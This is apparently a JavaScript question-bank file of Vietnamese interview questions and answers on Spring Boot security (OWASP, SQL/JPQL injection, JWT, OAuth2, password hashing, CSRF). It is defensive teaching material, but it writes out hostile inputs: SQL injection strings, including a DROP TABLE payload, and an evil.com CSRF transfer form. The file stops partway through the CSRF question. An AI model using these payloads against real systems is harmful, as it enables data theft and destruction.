/* Câu hỏi topic `security`. Schema & markup: AGENTS.md mục 4–6. */
(window.QUESTIONS = window.QUESTIONS || []).push(
{
  id: 'security-001',
  topic: 'security',
  level: 'senior',
  q: 'Áp dụng OWASP Top 10 vào backend Java Spring Boot: nêu 3 lỗ hổng phổ biến nhất và cách chặn tại code/cấu hình.',
  a: `**Tóm tắt:** Ba lỗ hổng hay gặp nhất trong backend Java là **Broken Access Control** (IDOR khi xem tài nguyên người khác), **Cryptographic Failures** (lưu mật khẩu sai, dùng thuật toán yếu), và **Injection** (SQL/NoSQL/LDAP injection do nối chuỗi). Mỗi lỗ hổng có biện pháp chặn cụ thể ở tầng code và cấu hình Spring.

### 1. Broken Access Control (A01:2021)
- **Ví dụ thực tế**: API
~~~text
GET /api/accounts/{accountId}/transactions
~~~
trả về sao kê. Attacker đổi {{accountId}} sang tài khoản khác và thấy dữ liệu — **IDOR (Insecure Direct Object Reference)**.
- **Cách chặn**:
  - **Kiểm tra quyền theo object**: trong service, verify {{accountRepository.existsByIdAndUserId(accountId, currentUserId)}} trước khi trả dữ liệu.
  - Dùng Spring Security **{{@PreAuthorize("@accountSecurity.canAccess(#accountId)")}}** hoặc custom {{PermissionEvaluator}}.
  - Không tin tưởng {{principal}} từ token mà không validate ownership.

~~~java
@Service
@RequiredArgsConstructor
public class TransactionService {
    private final AccountRepository accountRepo;
    private final TransactionRepository txnRepo;

    public Page<Transaction> getTransactions(Long accountId, Pageable pageable) {
        // KIỂM TRA SO HỮU — chặn IDOR
        if (!accountRepo.existsByIdAndUserId(accountId, SecurityUtil.getCurrentUserId())) {
            throw new NotFoundException("ACCOUNT_NOT_FOUND", "Tài khoản không tồn tại");
        }
        return txnRepo.findByAccountId(accountId, pageable);
    }
}
~~~

### 2. Cryptographic Failures (A02:2021)
- **Ví dụ thực tế**: Lưu mật khẩu bằng {{SHA-256}} không salt, hoặc dùng {{AES-ECB}} mã hoá số thẻ. Dữ liệu bị lộ khi DB leak.
- **Cách chặn**:
  - **Mật khẩu**: dùng hàm hash chậm chuyên cho mật khẩu: **Argon2id** (memory-hard), **bcrypt** (cost ≥ 10, thường chọn 12), hoặc PBKDF2 khi cần FIPS. Spring Security cung cấp {{BCryptPasswordEncoder}} và {{Argon2PasswordEncoder}}.
  - **Dữ liệu nhạy cảm cần giải mã** (số thẻ, CCCD): dùng **AES-GCM** (authenticated encryption) với key 256-bit, IV ngẫu nhiên 12 byte mỗi lần. Quản lý key bằng **HashiCorp Vault**, AWS KMS, hoặc Spring Cloud Config + encryption.
  - **Không** tự implement crypto; dùng thư viện chuẩn ({{javax.crypto}}, Bouncy Castle).

~~~java
// ✅ ĐÚNG: Hash mật khẩu
@Bean PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // cost 12: cỡ vài trăm ms/lần tuỳ CPU — hãy đo trên máy thật
}

// ✅ ĐÚNG: AES-GCM cho dữ liệu cần giải mã
public String encrypt(String plain, SecretKey key) throws GeneralSecurityException {
    byte[] iv = new byte[12]; new SecureRandom().nextBytes(iv);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    byte[] ct = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct).array());
}
~~~

### 3. Injection (A03:2021)
- **SQL Injection**: dùng {{JdbcTemplate}} với {{?}} placeholder, **không** nối chuỗi. JPQL/HQL cũng bị injection nếu concat: {{entityManager.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'")}}.
- **ORDER BY động**: không thể dùng placeholder; phải **whitelist** cột cho phép.
- **NoSQL/LDAP injection**: Spring Data MongoDB {{@Query}} với {{?0}} placeholder; LDAP dựng filter bằng {{LdapQueryBuilder}} / {{EqualsFilter}} (tự encode ký tự đặc biệt) hoặc {{LdapEncoder.filterEncode()}}, không nối chuỗi filter.

| Vector | Sai (nối chuỗi) | Đúng (parameterized) |
|---|---|---|
| SQL | {{jdbc.query("SELECT * FROM t WHERE c = '" + v + "'")}} | {{jdbc.query("SELECT * FROM t WHERE c = ?", v)}} |
| JPQL | {{em.createQuery("SELECT u FROM User u WHERE u.email = '" + email + "'")}} | {{em.createQuery("SELECT u FROM User u WHERE u.email = :email").setParameter("email", email)}} |
| ORDER BY | {{repo.findAll(Sort.by(userInput))}} | {{repo.findAll(Sort.by(whitelist.contains(userInput) ? userInput : "id"))}} |

> Senior tip: trong code review ngân hàng, **bất kỳ** nối chuỗi vào câu query/JPQL là finding P1. Dùng static analysis có taint analysis: SpotBugs + plugin **Find Security Bugs** (rule {{SQL_INJECTION_JDBC}}, {{SQL_INJECTION_JPA}}), SonarQube rule {{java:S3649}} (SQL injection), hoặc Semgrep/CodeQL, và chặn merge khi có finding.

### Bảng tóm tắt chặn OWASP Top 10 cho Spring Boot
| Thứ tự | Lỗ hổng | Biện pháp chính |
|---|---|---|
| A01 | Broken Access Control | {{@PreAuthorize}}, ownership check trong service, deny-by-default |
| A02 | Cryptographic Failures | bcrypt/Argon2 cho pass, AES-GCM cho data, key rotation, Vault/KMS |
| A03 | Injection | Parameterized query, whitelist ORDER BY, input validation |
| A04 | Insecure Design | Threat modeling, secure design pattern, rate limit, audit log |
| A05 | Security Misconfiguration | Spring Boot Actuator lockdown, disable debug, security headers |
| A06 | Vulnerable Components | SCA (OWASP Dependency Check), SBOM, Dependabot, patch SLA |
| A07 | Identification & Auth Failures | MFA, rate limit login, breached password check, session management |
| A08 | Software & Data Integrity Failures | Signed artifacts, CI/CD integrity, reproducible build |
| A09 | Logging & Monitoring Failures | Structured log (JSON), correlation ID, alert trên 4xx/5xx pattern |
| A10 | SSRF | Whitelist outbound URL, deny localhost/private IP, timeout |

`,
  follow: [
    'Khi nào nên dùng AES-GCM thay vì bcrypt, và ngược lại?',
    'Spring Security {{@PreAuthorize}} với SpEL so với custom {{PermissionEvaluator}} khác nhau như thế nào về hiệu năng và khả năng mở rộng?',
    'Làm sao phát hiện SQL injection tiềm ẩn trong codebase lớn (hơn 500k LOC) một cách tự động?'
  ],
  tags: ['OWASP', 'Spring Security', 'IDOR', 'bcrypt', 'AES-GCM', 'SQL Injection']
},
{
  id: 'security-002',
  topic: 'security',
  level: 'senior',
  q: 'SQL Injection trong Java: PreparedStatement an toàn như thế nào? JPQL/HQL nối chuỗi bị khai thác ra sao? ORDER BY động xử lý thế nào?',
  a: `**Tóm tắt:** {{PreparedStatement}} an toàn vì **tách biệt code và data** — câu query được parse, compile, tối ưu hóa **trước** khi bind tham số, nên input không bao giờ được hiểu là SQL. JPQL/HQL nối chuỗi vẫn bị injection vì Hibernate parse chuỗi cuối cùng. ORDER BY động không dùng placeholder được → phải **whitelist** cột.

### Vì sao PreparedStatement an toàn
1. **Giai đoạn prepare**: Driver gửi {{SELECT * FROM users WHERE email = ?}} tới DB. DB **parse, resolve bảng/cột, build execution plan** — hoàn toàn không biết giá trị {{?}}.
2. **Giai đoạn execute**: Chỉ gửi giá trị tham số (binary protocol). DB **không re-parse** SQL, chỉ plug giá trị vào plan đã có.
3. Kết quả: input {{' OR '1'='1}} được coi là **dữ liệu literal**, không thể thay đổi cấu trúc câu lệnh.

> Lưu ý: không phải driver nào cũng prepare phía server. MySQL Connector/J mặc định {{useServerPrepStmts=false}} — driver tự escape và thay giá trị vào câu SQL phía client; PostgreSQL JDBC gửi tham số tách riêng qua extended protocol và chỉ dùng named server-side statement sau {{prepareThreshold}} (mặc định 5) lần. Dù cách nào thì giá trị vẫn được xử lý như dữ liệu, nên vẫn an toàn.

~~~java
// ✅ AN TOÀN — PreparedStatement
String sql = "SELECT * FROM users WHERE email = ? AND status = ?";
try (PreparedStatement ps = conn.prepareStatement(sql)) {
    ps.setString(1, email);      // driver escape tự động, hoặc binary bind
    ps.setString(2, "ACTIVE");
    ResultSet rs = ps.executeQuery();
}

// ✅ AN TOÀN — Spring NamedParameterJdbcTemplate
namedJdbc.query("SELECT * FROM users WHERE email = :email", Map.of("email", email), mapper);
~~~

### JPQL/HQL Injection — cái bẫy của ORM
Nhiều dev tin "ORM tự an toàn" — **SAI**. Hibernate chỉ an toàn khi dùng **named parameter** ({{:param}}) hoặc **positional parameter** ({{?1}}).

~~~java
// ❌ NGUY HIỂM — JPQL injection
String jpql = "SELECT u FROM User u WHERE u.email = '" + email + "'";
List<User> users = em.createQuery(jpql, User.class).getResultList();
// Input: x' OR '1'='1  →  ... WHERE u.email = 'x' OR '1'='1'  → trả về mọi user

// ✅ AN TOÀN — Named parameter
List<User> users = em.createQuery("SELECT u FROM User u WHERE u.email = :email", User.class)
                     .setParameter("email", email)
                     .getResultList();

// ✅ AN TOÀN — CriteriaBuilder (type-safe)
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> u = cq.from(User.class);
cq.select(u).where(cb.equal(u.get("email"), email));
List<User> users = em.createQuery(cq).getResultList();
~~~

**Khai thác thực tế**: Attacker truyền {{email = "admin' OR '1'='1"}} → bypass điều kiện lọc, hoặc dùng subquery để dò dữ liệu (blind injection). JPQL/HQL không cho multi-statement hay comment SQL, nên kiểu {{'; DROP TABLE users; --}} chỉ xảy ra với native query/JDBC nối chuỗi khi driver cho phép multi-statement.

### ORDER BY động — placeholder không dùng được
Placeholder chỉ thay được **giá trị**, không thay được **identifier/keyword**: tên cột trong {{ORDER BY}}, chiều {{ASC/DESC}}, tên bảng/cột. Phải validate **whitelist** phía ứng dụng. ({{LIMIT ?}}/{{OFFSET ?}} thì bind được trên PostgreSQL, MySQL — vẫn nên parse sang {{int}} và giới hạn max.)

~~~java
// ❌ SAI — nối chuỗi
String sql = "SELECT * FROM transactions ORDER BY " + sortColumn + " " + sortDir;

// ✅ ĐÚNG — Whitelist
private static final Set<String> ALLOWED_COLUMNS = Set.of("id", "amount", "created_at", "status");
private static final Set<String> ALLOWED_DIRS = Set.of("ASC", "DESC");

public List<Transaction> findAll(String sortColumn, String sortDir) {
    String col = ALLOWED_COLUMNS.contains(sortColumn) ? sortColumn : "created_at";
    String dir = ALLOWED_DIRS.contains(sortDir.toUpperCase()) ? sortDir.toUpperCase() : "DESC";
    return jdbc.query("SELECT * FROM transactions ORDER BY " + col + " " + dir, mapper);
}

// Spring Data JPA — Sort an toàn
Sort sort = Sort.by(Sort.Direction.fromString(dir), col);
return repo.findAll(sort);
~~~

### Native Query trong Spring Data JPA
{{@Query(value = "SELECT * FROM t WHERE c = ?1", nativeQuery = true)}} — **an toàn** vì dùng positional parameter như PreparedStatement.
Giá trị của annotation phải là hằng compile-time nên không nối biến runtime vào {{@Query}} được; rủi ro thực tế nằm ở custom repository dùng {{em.createNativeQuery("..." + param)}} hoặc {{JdbcTemplate}} nối chuỗi.

### Tại sao ORM không "tự an toàn"?
- ORM sinh SQL từ string bạn cung cấp. Nếu string chứa input không kiểm soát, SQL sinh ra cũng chứa input đó.
- {{entityManager.createNativeQuery("SELECT * FROM users WHERE name = '" + name + "'")}} tương đương nối chuỗi SQL thuần.
- {{CriteriaBuilder}} và {{Specification}} an toàn vì xây dựng AST (Abstract Syntax Tree), không nối chuỗi.

### Pitfall production
- **Logging**: Log câu SQL kèm tham số ({{logging.level.org.hibernate.SQL=DEBUG}}, Hibernate 6: {{logging.level.org.hibernate.orm.jdbc.bind=TRACE}}) — **không bật log parameter value trên production** nếu có PII/credential.
- **Batch insert**: {{JdbcTemplate.batchUpdate(sql, batchArgs)}} — mỗi {{batchArgs[i]}} là mảng tham số, an toàn.
- **Stored procedure**: {{CallableStatement}} với {{?}} placeholder cũng an toàn.

> Senior tip: đừng trả message lỗi SQL/stack trace về client (lộ schema, hỗ trợ error-based injection) — dùng error handler chung. Trong CI, chạy SpotBugs + Find Security Bugs (rule {{SQL_INJECTION_JDBC}}, {{SQL_INJECTION_JPA}}) và SonarQube rule {{java:S3649}}. Tài khoản DB của app chỉ có quyền tối thiểu (không DDL) để giới hạn thiệt hại. Với legacy code dùng {{StringBuilder}} build query, refactor sang {{CriteriaBuilder}} hoặc {{jOOQ}} (type-safe SQL builder).`,
  follow: [
    'Vì sao {{PreparedStatement}} có thể chậm hơn {{Statement}} ở lần đầu, nhưng nhanh hơn ở các lần sau?',
    'Native query với {{LIMIT ? OFFSET ?}} có an toàn không? Tại sao?',
    'Làm sao bảo vệ ứng dụng khỏi second-order SQL injection (dữ liệu độc lưu trong DB, sau đó dùng trong query khác)?'
  ],
  tags: ['SQL Injection', 'PreparedStatement', 'JPQL', 'HQL', 'ORDER BY', 'CriteriaBuilder', 'jOOQ']
},
{
  id: 'security-003',
  topic: 'security',
  level: 'senior',
  q: 'JWT: cấu trúc 3 phần, HS256 vs RS256 chọn cái nào khi nào? Validate những claim nào bắt buộc? Cách thu hồi token và refresh token rotation?',
  a: `**Tóm tắt:** JWT gồm **Header.Payload.Signature**. Dùng **RS256** (asymmetric) cho hệ thống phân tán/microservices — public key verify, private key sign; **HS256** (symmetric) chỉ dùng cho monolith đơn giản. Validate bắt buộc: {{exp}}, {{nbf}}, {{iat}}, {{iss}}, {{aud}}, {{sub}}. Thu hồi token: dùng **denylist (blocklist)** trong Redis với TTL = {{exp - now}}, hoặc **token version** trong DB. Refresh token rotation: mỗi lần dùng refresh token cũ → revoke, cấp cặp mới (access + refresh), phát hiện reuse → revoke toàn bộ chuỗi.

### Cấu trúc JWT
- **Header**:
~~~json
{"alg":"RS256","typ":"JWT"}
~~~
— base64url encoded.
- **Payload (claims)**: {{sub}} (subject/userId), {{exp}} (expiry Unix timestamp), {{iat}} (issued at), {{iss}} (issuer), {{aud}} (audience), {{jti}} (JWT ID), custom claims ({{roles}}, {{permissions}}, {{token_version}}).
- **Signature**: {{base64url(header) + "." + base64url(payload)}} ký bằng private key (RS256) hoặc secret (HS256).

### HS256 vs RS256 — chọn cái nào?
| Tiêu chí | HS256 (HMAC-SHA256) | RS256 (RSA-SHA256) |
|---|---|---|
| Key | Secret chung (cả sign & verify) | Private key sign, Public key verify |
| Phân phối key | Khó: mọi service cần secret | Dễ: public key public, JWKS endpoint |
| Key rotation | Phức tạp (cần sync secret) | Dễ: thêm key mới vào JWKS, {{kid}} trong header |
| Hiệu năng | Rất nhanh (HMAC) | Ký RSA chậm hơn nhiều; verify khá nhanh |
| Use case | Monolith, single service, internal API | Microservices, B2B, OIDC provider, multi-tenant |

> **Khuyên dùng RS256** cho mọi hệ thống có khả năng mở rộng sang microservices. HS256 chỉ chấp nhận cho prototype/monolith nhỏ, không chia sẻ secret qua mạng.

### Validate claim bắt buộc (Spring Security / Nimbus JOSE)
~~~java
NimbusJwtDecoder decoder = NimbusJwtDecoder.withJwkSetUri(jwkSetUri).build();
// Mặc định chỉ kiểm tra signature + exp/nbf (JwtTimestampValidator, clock skew 60s).
// iss: dùng createDefaultWithIssuer; aud: phải tự thêm validator.
OAuth2TokenValidator<Jwt> audience = jwt -> jwt.getAudience().contains("my-api")
    ? OAuth2TokenValidatorResult.success()
    : OAuth2TokenValidatorResult.failure(
          new OAuth2Error("invalid_token", "Invalid audience", null));
decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(
    JwtValidators.createDefaultWithIssuer(issuer), audience));
~~~
Spring Boot 3.x: chỉ cần khai báo {{spring.security.oauth2.resourceserver.jwt.issuer-uri}} và {{...jwt.audiences}} (Boot 3.1+) là có validator iss/aud. Kiểm tra {{token_version}} (xem dưới) là một validator riêng, đọc version của user từ cache.

### Thu hồi token (Revocation)
1. **Short-lived access token** (5-15 phút) — giảm window tấn công, không cần revoke chủ động.
2. **Denylist (blocklist) trong Redis**: lưu {{jti}} với TTL = {{exp - now}}. Verify signature + {{exp}} **trước**, rồi mới tra denylist bằng {{jti}} (đừng tin {{jti}} của token chưa verify).
3. **Token version trong DB**: user table có cột {{token_version}} (int). Mỗi lần đổi pass/mất thiết bị → {{token_version++}}. JWT chứa {{token_version}} tại thời điểm cấp. Validate: so sánh {{jwt.token_version == user.token_version}}.
4. **Opaque token**: access token là random string, introspect qua {{/oauth2/introspect}} — revoke tức thì nhưng tăng latency.

### Refresh Token Rotation (RTR) — RFC 9700 (OAuth 2.0 Security BCP) / OAuth 2.1
- Access token: 5-15 min. Refresh token: 7-30 ngày, **one-time use**.
- Flow: Client gửi refresh token → Server **verify + revoke refresh token cũ** → cấp **cặp mới** (access + refresh mới).
- **Phát hiện token reuse**: Nếu cùng một refresh token được dùng lần 2 → **revoke toàn bộ chuỗi token** của user (giả định token bị đánh cắp), force logout tất cả thiết bị.
- Lưu **SHA-256** của refresh token trong DB, không lưu plaintext (token là chuỗi random ≥ 256-bit nên không cần bcrypt; bcrypt có salt ngẫu nhiên sẽ không tra cứu theo hash được). Kèm {{device_id}}, {{ip}}, {{user_agent}} để audit.

~~~java
@Transactional
public TokenPair refresh(RefreshRequest req) {
    RefreshToken stored = refreshRepo.findByTokenHashForUpdate(sha256(req.refreshToken()))
        .orElseThrow(() -> new InvalidTokenException("Invalid refresh token"));
    // Phát hiện reuse: token đã bị rotate mà vẫn được gửi lại
    if (stored.isRevoked()) {
        revokeAllUserTokens(stored.getUserId()); // revoke cả chuỗi, force logout
        throw new InvalidTokenException("Token reuse detected");
    }
    if (stored.getExpiresAt().isBefore(Instant.now())) {
        throw new InvalidTokenException("Refresh token expired");
    }
    stored.setRevoked(true); // one-time use
    refreshRepo.save(stored);
    return issueNewTokenPair(stored.getUserId(), req.deviceId());
}
~~~

> Senior tip: **luôn dùng RS256 + JWKS** (Spring Boot: {{spring.security.oauth2.resourceserver.jwt.jwk-set-uri}}). Access token 5-10 phút, refresh token 7 ngày + rotation. Lưu {{jti}} vào Redis denylist cho logout tức thì. KHÔNG bỏ kiểm tra {{exp}}/{{iss}}/{{aud}}, và **cố định thuật toán** chấp nhận (không tin {{alg}} trong header). Với ngân hàng: TTL còn ngắn hơn, kèm step-up/MFA cho giao dịch nhạy cảm.`,
  follow: [
    'Algorithm confusion (RS256 → HS256 dùng public key làm secret, {{alg=none}}) là gì và cách phòng?',
    'JWT {{kid}} (Key ID) trong header dùng làm gì trong key rotation?',
    'So sánh opaque token vs JWT cho access token: ưu/nhược điểm thực tế?'
  ],
  tags: ['JWT', 'RS256', 'HS256', 'Refresh Token Rotation', 'Revocation', 'JWKS']
},
{
  id: 'security-004',
  topic: 'security',
  level: 'senior',
  q: 'OAuth2/OIDC: Authorization Code + PKCE, Client Credentials — chọn flow nào cho SPA, mobile, service-to-service? Tại sao Implicit flow đã deprecated?',
  a: `**Tóm tắt:** **Authorization Code + PKCE** là chuẩn cho **SPA và mobile app** (public client). **Client Credentials** cho **service-to-service** (confidential client, không có user). **Implicit flow** deprecated vì token trả về qua URL fragment → rò rỉ qua log, referer, history; không có refresh token; dễ bị token injection.

### Các flow chính
| Flow | Client type | Có user? | Token endpoint? | Refresh token? | PKCE? |
|---|---|---|---|---|---|
| Authorization Code + PKCE | Public (SPA, mobile) | Có | Có | Có | **Bắt buộc** |
| Client Credentials | Confidential (backend) | Không | Có | Không | Không |
| Device Code (RFC 8628) | IoT, TV | Có (qua thiết bị khác) | Có | Có | Không áp dụng |
| Resource Owner Password | Legacy migration only — đã bị loại trong OAuth 2.1, RFC 9700: MUST NOT | Có | Có | Có | Không |

> OAuth 2.1 / RFC 9700 khuyến nghị PKCE cho **mọi** client dùng Authorization Code, kể cả confidential client (web backend), không chỉ SPA/mobile.

### Authorization Code + PKCE (RFC 7636) — SPA & Mobile
1. App sinh {{code_verifier}} (random 43-128 chars) → {{code_challenge = BASE64URL(SHA256(code_verifier))}}.
2. Redirect user: {{/authorize?response_type=code&client_id=...&code_challenge=...&code_challenge_method=S256&redirect_uri=...&state=...}}.
3. User login/consent → Auth server redirect về {{redirect_uri?code=...&state=...}}.
4. App gọi {{/token}} với {{code}}, {{code_verifier}}, {{client_id}} (public client **không** gửi {{client_secret}}).
5. Auth server verify {{SHA256(code_verifier) == code_challenge}} → cấp access + refresh token.

**Tại sao PKCE?** Chặn **authorization code interception attack**: kẻ tấn công chặn {{code}} nhưng không có {{code_verifier}} nên không đổi được token.

~~~java
// Spring Security 6 (backend/BFF login): bật PKCE cả cho confidential client
@Bean
SecurityFilterChain filterChain(HttpSecurity http, ClientRegistrationRepository repo) throws Exception {
    DefaultOAuth2AuthorizationRequestResolver resolver =
        new DefaultOAuth2AuthorizationRequestResolver(repo, "/oauth2/authorization");
    resolver.setAuthorizationRequestCustomizer(OAuth2AuthorizationRequestCustomizers.withPkce());
    http.oauth2Login(login -> login
        .authorizationEndpoint(ep -> ep.authorizationRequestResolver(resolver)));
    return http.build();
}
// Public client (client-authentication-method=none): Spring tự thêm PKCE
~~~
Với SPA, mẫu được khuyến nghị hiện nay là **BFF (Backend-for-Frontend)**: backend Spring làm confidential client giữ token, SPA chỉ giữ session cookie HttpOnly — token không nằm trong JS nên XSS khó lấy cắp.

### Client Credentials — Service-to-Service
- Client gửi {{client_id}} + {{client_secret}} (hoặc {{client_assertion}} JWT) tới {{/token}} với {{grant_type=client_credentials}}.
- Không có user context → {{sub}} là {{client_id}}. Phù hợp: internal API, batch job, scheduler.
- **mTLS client authentication** (RFC 8705) hoặc **private_key_jwt** (client assertion ký bằng private key, RFC 7523) an toàn hơn shared secret.

~~~java
// Spring (servlet): WebClient tự lấy và cache token client_credentials
@Bean
WebClient webClient(OAuth2AuthorizedClientManager manager) { // manager có provider clientCredentials
    ServletOAuth2AuthorizedClientExchangeFilterFunction oauth =
        new ServletOAuth2AuthorizedClientExchangeFilterFunction(manager);
    oauth.setDefaultClientRegistrationId("internal-api");
    return WebClient.builder().apply(oauth.oauth2Configuration()).build();
}
~~~

### Implicit Flow — Tại sao deprecated (RFC 9700: SHOULD NOT, OAuth 2.1 loại bỏ)
- Access token trả trong **URL fragment** ({{#access_token=...}}) → rò rỉ qua:
  - Browser history
  - Referer header khi load resource bên thứ 3
  - Log server/proxy
- Không có refresh token → token dài hạn (unsafe) hoặc user phải login lại liên tục.
- Không xác thực client (public client) → dễ **token injection** (kẻ tấn công chèn token của mình vào victim app).
- Thay thế: **Authorization Code + PKCE** (có refresh token, code không lộ token).

### OIDC (OpenID Connect) — thêm {{id_token}}
- {{id_token}} là JWT chứa thông tin user ({{sub}}, {{name}}, {{email}}, {{preferred_username}}...).
- Flow: Authorization Code + PKCE + {{scope=openid profile email}}.
- {{nonce}} trong request → {{id_token}} chứa {{nonce}} → **chống replay attack**.
- {{UserInfo}} endpoint: {{/userinfo}} (cần access token) để lấy thêm claim.

> Senior tip: SPA **không bao giờ** lưu {{client_secret}}. Dùng PKCE + {{client_authentication_method=none}}. Mobile: dùng **AppAuth** library (iOS/Android) hỗ trợ PKCE tự động. Service-to-service: ưu tiên **mTLS + Client Credentials** hoặc **private_key_jwt** thay vì secret. Bắt buộc PKCE phía Auth server (Spring Authorization Server: {{ClientSettings.builder().requireProofKey(true)}}; Keycloak: đặt PKCE method {{S256}} cho client), và chỉ chấp nhận redirect_uri khớp chính xác.`,
  follow: [
    'PKCE {{code_challenge_method=S256}} vs {{plain}} — tại sao {{plain}} không an toàn?',
    'Resource Owner Password Credentials Grant (ROPC) còn dùng được khi nào? Rủi ro gì?',
    'Làm sao implement "login với Google/GitHub" (social login) trong Spring Boot — flow nào, config gì?'
  ],
  tags: ['OAuth2', 'OIDC', 'PKCE', 'Authorization Code', 'Client Credentials', 'Implicit Flow']
},
{
  id: 'security-005',
  topic: 'security',
  level: 'senior',
  q: 'Lưu mật khẩu: bcrypt vs Argon2id — chọn cái nào khi nào? Cost factor/salt là gì? Tại sao KHÔNG dùng SHA-256 hay mã hoá hai chiều (AES) cho mật khẩu?',
  a: `**Tóm tắt:** **Argon2id** (memory-hard; OWASP tối thiểu m=19 MiB, t=2, p=1) hoặc **bcrypt** (cost ≥ 10, thường chọn 12) là hai lựa chọn hàng đầu cho production; scrypt và PBKDF2 (khi cần FIPS) cũng được chấp nhận. **SHA-256/512 quá nhanh** — GPU hash hàng tỷ/s, dễ brute-force. **Mã hoá hai chiều (AES) có thể giải mã** — nếu key bị lộ, toàn bộ mật khẩu lộ. Mật khẩu phải **hash một chiều** + **salt duy nhất** mỗi user.

### Tại sao KHÔNG dùng SHA-256/512 (dù có salt)?
- Thiết kế cho **tốc độ** (checksum, integrity), không phải **độ khó**.
- Một GPU đời mới (ví dụ RTX 4090, theo benchmark hashcat) đạt cỡ hàng chục tỷ SHA-256/giây → không gian 8 ký tự alphanumeric (62^8 ≈ 2,2×10^14) bị vét hết trong vài giờ.
- Salt chỉ ngăn rainbow table và buộc attacker crack từng user riêng, **không** làm chậm mỗi lần thử.

### Tại sao KHÔNG dùng mã hoá hai chiều (AES, RSA)?
- Có key → giải mã được. Key lưu ở đâu? Config, Vault, HSM — nếu bị xfiltrate thì **toàn bộ DB mật khẩu lộ**.
- Hash một chiều: attacker có DB cũng không đảo ngược được (chỉ brute-force, rất chậm với bcrypt/Argon2).

### Bcrypt — chuẩn de facto Java/Spring
- Cost factor (log2 rounds): cost 10 = 1024 rounds, cost 12 = 4096 rounds, cost 14 = 16384 rounds.
- Salt 128-bit tự động embed trong hash:
~~~text
$2a$12$AbCdEfGhIjKlMnOpQrStUvWxYz...
~~~
- Giới hạn 72 byte input (UTF-8 — tiếng Việt có dấu tốn 2–3 byte/ký tự). Thuật toán gốc bỏ qua phần thừa; Spring Security các bản vá sau CVE-2025-22228 từ chối input > 72 byte thay vì cắt im lặng.
- Spring: {{new BCryptPasswordEncoder(12)}}.

~~~java
@Bean PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12); // mặc định Spring là 10; đo để mỗi lần hash cỡ vài trăm ms
}
// Verify
if (encoder.matches(rawPassword, storedHash)) { ... }
// Upgrade cost khi user login thành công
if (encoder.upgradeEncoding(storedHash)) {
    user.setPassword(encoder.encode(rawPassword));
    userRepo.save(user);
}
~~~

### Argon2id — winner PHC 2015, khuyên dùng mới
- **Memory-hard**: tốn RAM lớn → GPU/ASIC khó tối ưu (khác bcrypt chỉ CPU-hard).
- 3 tham số: {{timeCost}} (iterations), {{memoryCost}} (KB), {{parallelism}} (lanes).
- Tham số tham khảo: OWASP Password Storage Cheat Sheet tối thiểu {{m=19456}} (19 MiB), {{t=2}}, {{p=1}}; RFC 9106 (tuỳ chọn thứ hai) {{m=65536}} (64 MiB), {{t=3}}, {{p=4}}.
- Spring Security (từ 5.3): {{Argon2PasswordEncoder}} (cần Bouncy Castle {{bcprov}} trên classpath). {{Argon2PasswordEncoder.defaultsForSpringSecurity_v5_8()}} dùng salt 16B, hash 32B, p=1, m=16 MiB, t=2.
- Hash output:
~~~text
$argon2id$v=19$m=65536,t=3,p=4$c2FsdA$hash
~~~

~~~java
@Bean PasswordEncoder argon2Encoder() {
    // Thứ tự tham số: saltLength, hashLength, parallelism, memory (KiB), iterations
    return new Argon2PasswordEncoder(16, 32, 4, 65536, 3);
}
~~~

### So sánh thực tế
| Tiêu chí | Bcrypt (cost 12) | Argon2id (m=64MB,t=3,p=4) |
|---|---|---|
| Thời gian hash | Phụ thuộc CPU — đo thực tế | Phụ thuộc tham số — đo thực tế |
| RAM dùng | ~4KB | 64MB mỗi lần hash |
| Kháng GPU/ASIC | Trung bình (CPU-hard) | **Rất tốt** (memory-hard) |
| Hỗ trợ Spring Security | Built-in ({{spring-security-crypto}}) | Từ 5.3 (cần Bouncy Castle) |
| Thư viện Java | {{jbcrypt}} / Spring Security | {{argon2-jvm}} / Spring Security |

### Salt — bắt buộc, duy nhất, đủ dài
- Mỗi user **một salt riêng** (random 16+ byte). Bcrypt/Argon2 tự generate và embed trong hash.
- **Không** dùng salt chung cho toàn hệ thống — nếu lộ, attacker brute-force song song tất cả user.

> Senior tip: **Mặc định dùng bcrypt cost 12** (đủ an toàn, ít dependency, Spring built-in). Nâng cấp Argon2id khi có team bảo mật dedicated và infra cho phép RAM 64MB/hash. **Không bao giờ** log mật khẩu raw. Dùng {{PasswordEncoder.matches()}} — nó constant-time so sánh (chống timing attack). Kiểm tra {{upgradeEncoding()}} mỗi lần login để nâng cost dần. Dùng {{PasswordEncoderFactories.createDelegatingPasswordEncoder()}} ({{DelegatingPasswordEncoder}}): hash lưu kèm prefix id thuật toán (bcrypt, argon2…) nên có thể đổi thuật toán mà hash cũ vẫn verify được.`,
  follow: [
    'Bcrypt giới hạn 72 byte input — ảnh hưởng gì nếu user đặt passphrase 100 ký tự? Cách xử lý?',
    'Argon2id tham số {{parallelism}} ảnh hưởng thế nào đến bảo mật và hiệu năng?',
    'Làm sao migrate từ bcrypt sang Argon2id cho hệ thống 10 triệu user không downtime?'
  ],
  tags: ['Password Hashing', 'bcrypt', 'Argon2id', 'SHA-256', 'Cost Factor', 'Salt']
},
{
  id: 'security-006',
  topic: 'security',
  level: 'mid',
  q: 'CSRF và SameSite Cookie: khi nào API cần chống CSRF, khi nào không? Cấu hình Spring Security CSRF thế nào cho REST API + SPA?',
  a: `**Tóm tắt:** **CSRF** tấn công khi browser tự gửi cookie (session) kèm request giả mạo từ trang khác. **SameSite=Lax/Strict** chặn hầu hết CSRF hiện nay. **Cần CSRF token** khi: dùng cookie authentication (session/{{JSESSIONID}}), SameSite=None (cross-site), hoặc legacy browser. **KHÔNG cần** khi: stateless JWT (header {{Authorization: Bearer <token>}}), API chỉ dùng Bearer token, SameSite=Strict/Lax + same-site.

### Cơ chế CSRF
- Victim login {{bank.com}} → có cookie {{JSESSIONID}}.
- Attacker trang {{evil.com}} nhúng {{<form action="https://bank.com/transfer" method="POST">}} → victim click → browser gửi kèm {{JSESSIONID}} → chuyển tiền thành công.
- Yếu tố then chốt: **browser tự gửi cookie** với request cross-origin.

